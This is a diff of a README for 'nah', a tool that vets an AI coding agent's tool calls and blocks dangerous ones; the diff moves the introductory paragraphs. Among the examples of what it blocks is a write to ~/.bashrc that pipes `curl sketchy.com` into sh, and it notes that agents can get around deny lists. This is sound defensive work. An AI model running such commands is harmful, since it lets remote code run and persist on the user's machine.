@@ -22,6 +22,10 @@
 
 Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fine sometimes. And git checkout is sometimes catastrophic. Even when you curate permissions, 200 IQ Opus can find a way around it. Maintaining a deny list is a fool’s errand.
 
+We needed something like --dangerously-skip-permissions but that doesn’t nuke your untracked files, exfiltrate your keys, or install malware.
+
+`nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
+
 `git push` — Sure.<br>
 `git push --force` — **nah?**
 
@@ -33,10 +37,6 @@ Claude Code’s permission system is allow-or-deny per tool, but that doesn’t 
 
 **Write** `./config.yaml` — Fine.<br>
 **Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**
-
-We needed something like --dangerously-skip-permissions but that doesn’t nuke your untracked files, exfiltrate your keys, or install malware.
-
-`nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
 ## Install
 
